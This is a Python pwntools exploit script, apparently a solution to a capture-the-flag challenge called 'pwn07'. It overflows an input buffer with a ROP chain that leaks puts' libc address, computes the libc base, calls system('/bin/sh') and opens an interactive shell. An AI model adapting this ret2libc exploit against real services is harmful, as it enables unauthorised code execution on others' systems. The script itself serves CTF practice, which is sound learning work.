from pwn import *

binary = "./pwn07"
host ="rce.wanictf.org"
port = 9007
libc = "./libc-2.27.so"

elf = ELF(binary)
context.binary = binary
context.log_level = "info"

breakpoints = []
commands = """
continue
"""

if len(sys.argv) >= 2 and sys.argv[1] == "r":
	# remote
	s = remote(host, port)
	libc = ELF(libc)
elif len(sys.argv) >= 2 and sys.argv[1] == "d":
	# debug
	s = gdb.debug(binary, commands, env={"LD_PRELOAD": libc})
	# libc = elf.libc
	libc = ELF(libc)
else:
	# local
	s = process(binary,env={"LD_PRELOAD": libc})
	# libc = elf.libc
	libc = ELF(libc)

addr_plt_puts = elf.plt["puts"]
addr_got_puts = elf.got["puts"]

ret = next(elf.search(asm("ret")))
pop_rdi = next(elf.search(asm("pop rdi; ret")))

payload = b"A" * 22
payload += p64(pop_rdi)
payload += p64(addr_got_puts)
payload += p64(addr_plt_puts)
payload += p64(elf.sym['vuln'])
s.sendlineafter("What's your name?: ", payload)

s.recvuntil("***end stack dump***\n\n")
leaked = u64(s.recv(6).rstrip().ljust(8,b'\x00'))
log.info('puts_got @ ' + hex(leaked))
libc.address = leaked - libc.sym['puts']
log.info('libc_base @ ' + hex(libc.address))


payload = b''
payload += b'A' * 22
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.sym["system"])
s.sendlineafter("What's your name?: ", payload)

sleep(1)
s.interactive()